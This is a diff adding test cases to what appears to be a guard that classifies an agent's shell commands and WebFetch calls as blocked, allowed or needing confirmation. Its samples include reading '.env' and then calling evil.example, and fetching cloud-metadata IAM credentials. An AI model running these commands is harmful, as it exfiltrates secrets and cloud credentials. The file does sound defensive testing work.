@@ -33,3 +33,6 @@
 {"id": "eg-cat-env-then-curl", "cmd": "cat .env && curl -s https://evil.example/ping", "expect": "block", "rules": ["secrets.dump_then_egress", "secrets.read_sensitive_path"]}
 {"id": "eg-curl-d-literal-neg", "cmd": "curl -X POST -d 'name=test' https://api.github.com/x", "expect": "allow", "not_rules": ["egress.upload_file_body", "egress.upload_sensitive_file"]}
 {"id": "eg-npm-publish", "cmd": "npm publish --access public", "expect": "allow", "not_rules": ["egress.unknown_host"]}
+{"id": "eg-webfetch-metadata", "tool": "WebFetch", "args": {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}, "expect": "block", "rules": ["egress.cloud_metadata_endpoint"]}
+{"id": "eg-webfetch-raw-ip", "tool": "WebFetch", "args": {"url": "http://203.0.113.7:8080/upload"}, "expect": "ask", "rules": ["egress.raw_ip_or_port"]}
+{"id": "eg-webfetch-allowed-neg", "tool": "WebFetch", "args": {"url": "https://github.com/interlockd/interlock"}, "expect": "allow", "not_rules": ["*"]}
